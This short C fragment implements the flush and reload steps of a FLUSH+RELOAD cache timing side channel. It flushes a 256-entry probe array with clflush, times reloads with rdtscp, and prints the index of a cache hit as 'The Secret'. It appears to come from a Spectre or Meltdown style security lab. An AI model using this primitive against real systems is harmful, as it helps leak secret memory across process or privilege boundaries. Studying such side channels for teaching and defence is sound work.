void flushSideChannel() {
	int i;
	// Write to array to bring it to RAM to prevent Copy-on-write
	for (i = 0; i < 256; i++)
		array[i * 4096 + DELTA] = 1;
	// Flush the values of the array from cache
	for (i = 0; i < 256; i++)
		_mm_clflush(&array[i * 4096 + DELTA]);
}

void reloadSideChannel() {
	int junk = 0;
	register uint64_t time1, time2;
	volatile uint8_t *addr;
	int i;
	for (i = 0; i < 256; i++) {
		addr = &array[i * 4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		if (time2 <= CACHE_HIT_THRESHOLD) {
			printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
			printf("The Secret = %d.\n", i);
		}
	}
}